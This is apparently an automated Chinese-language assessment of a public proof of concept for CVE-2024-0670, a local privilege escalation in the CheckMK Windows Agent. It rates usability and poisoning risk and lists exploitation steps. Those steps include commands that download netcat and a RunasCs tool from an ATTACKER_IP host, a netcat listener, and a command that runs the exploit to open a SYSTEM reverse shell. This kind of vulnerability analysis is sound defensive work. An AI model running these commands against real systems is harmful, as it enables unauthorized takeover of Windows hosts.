## CVE-2024-0670 - CheckMK Windows Agent 本地权限提升 (LPE)

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 本地权限提升 (LPE)

**影响应用:** CheckMK Windows Agent

**危害等级:** 高危

**CVSS评分:** 

**影响版本:** 未明确指出，请参考官方安全公告。

**利用条件:** 需要低权限Windows用户权限、Powershell启用、CheckMK Windows Agent已安装、能够下载文件。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

该POC针对CVE-2024-0670，CheckMK Windows Agent中的一个本地权限提升漏洞。此漏洞允许低权限用户通过滥用MSI修复机制期间执行的可写临时文件路径来获取NT AUTHORITY\SYSTEM权限。

**POC有效性分析:**
该POC包含一个PowerShell利用脚本（`exploit.ps1`）、一个自定义的`RunasCs.exe`工具（用于支持明文密码的`runas`替代品，源代码`RunasCs.cs`已提供）以及Netcat（`nc.exe`）用于建立反向Shell。利用流程设计清晰，易于理解和执行。攻击者首先在自己的机器上搭建一个简单的HTTP服务器，托管上述三个文件。目标机器上的低权限用户通过`Invoke-WebRequest`下载这些工具到`C:\Windows\Temp\`目录。随后，通过`RunasCs.exe`执行`exploit.ps1`。`exploit.ps1`会利用MSI修复过程，该过程会从`C:\Windows\Temp\`执行文件。通过在可预测的临时文件路径中植入恶意载荷（即Netcat反向Shell），当MSI修复触发时，攻击者的载荷将以SYSTEM权限执行。整个POC提供了一套完整的工具和详细步骤，旨在提供一个SYSTEM权限的反向Shell，充分证明了漏洞的有效性和可利用性。源代码的提供也增加了其透明度。

**利用步骤:**
1.  在攻击者机器上启动HTTP服务器，托管`RunasCs.exe`、`nc.exe`和`exploit.ps1`。
2.  在攻击者机器上启动Netcat监听器，例如执行`nc -lvnp 1111`。
3.  在目标Windows机器上（作为低权限用户），使用PowerShell下载工具：
    `Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/RunasCs.exe" -OutFile "C:\Windows\Temp\RunasCs.exe"`
    `Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"`
    `Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/exploit.ps1" -OutFile "C:\Windows\Temp\exploit.ps1"`
4.  执行以下命令触发漏洞：`.\RunasCs.exe username "password" "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1"`。
5.  如果成功，攻击者机器上的Netcat监听器将收到SYSTEM权限的反向Shell。

**投毒风险分析:**
该POC的投毒风险评估为低（10%）。主要依据以下几点：
1.  **代码透明度**: POC项目提供了`RunasCs.cs`的完整源代码。这份C#代码用于构建`RunasCs.exe`，它是一个定制的`runas`替代品，支持明文密码。对源代码的审查显示，其功能是明确的：通过创建新进程并注入凭据来以指定用户身份执行命令。代码中没有发现明显的混淆、加密或额外的恶意功能。
2.  **依赖外部工具**: POC依赖于`nc.exe`（Netcat），这是一个众所周知的网络工具，常用于建立反向Shell。它本身不是恶意软件，但其功能常被攻击者利用。POC指示用户从攻击者控制的HTTP服务器下载`nc.exe`和`RunasCs.exe`，这本身是利用流程的一部分，而不是POC代码本身的投毒。这意味着用户应该只从可信源获取这些工具，或者自行编译`RunasCs.exe`（POC提供了编译指南）。
3.  **主要脚本**: 虽然`exploit.ps1`脚本未完全提供，但其描述明确指出是用于利用CVE-2024-0670。它利用MSI修复机制来执行位于`C:\Windows\Temp\`的恶意文件。假设`exploit.ps1`的代码与Readme文件中的描述一致，其功能将是触发权限提升，最终运行攻击者提供的Netcat Payload。
4.  **无隐藏功能**: 提供的代码片段和描述没有暗示任何隐藏的、未声明的功能，如数据窃取、C2通信或额外的后门植入。整个POC的目标是实现一个SYSTEM权限的反向Shell，这是一个典型的权限提升漏洞利用结果。
**总结**: 鉴于源代码的可用性、对常见工具的依赖以及对利用过程的清晰描述，如果攻击者使用该POC进行攻击，其恶意性在于利用漏洞本身，而非POC代码中额外植入的后门或投毒行为。防御者在复现时，可以通过审查`RunasCs.cs`源码并自行编译`RunasCs.exe`，同时监控`exploit.ps1`的行为，来确保其安全性。

**项目地址:** https://github.com/DarkSecDevelopers/CVE-2024-0670

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2024-0670
